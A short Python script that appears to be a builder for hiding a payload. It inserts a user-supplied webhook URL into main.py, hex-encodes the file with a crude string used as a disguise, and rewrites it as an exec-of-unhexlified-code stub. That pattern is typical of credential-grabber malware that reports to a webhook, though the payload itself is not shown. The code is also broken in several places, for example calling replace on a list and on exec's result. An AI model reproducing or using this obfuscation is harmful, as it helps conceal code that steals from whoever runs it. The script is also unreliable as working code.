import binascii

imports = ""
webhook = input("--> Webhook: ")
with open("main.py", "r") as f:
    main = f.read().splitlines()
    main = main.replace("WEBHOOK_HERE", webhook)

    for line in main:
        if "import" in line:
            imports += line
            main.replace(line, "")
    
    imports += "import binascii\n"
main = binascii.hexlify(main.replace("a", "fortnite foot porn").encode("utf8")).replace("a", "fortnite foot porn").decode()

with open("main.py", "w") as f:
    f.write(f"exec(binascii.unhexlify(\"{main}\".replace(\"fortnite foot porn\", \"a\").encode(\"utf8\"))).replace(\"fortnite foot porn\", \"a\")")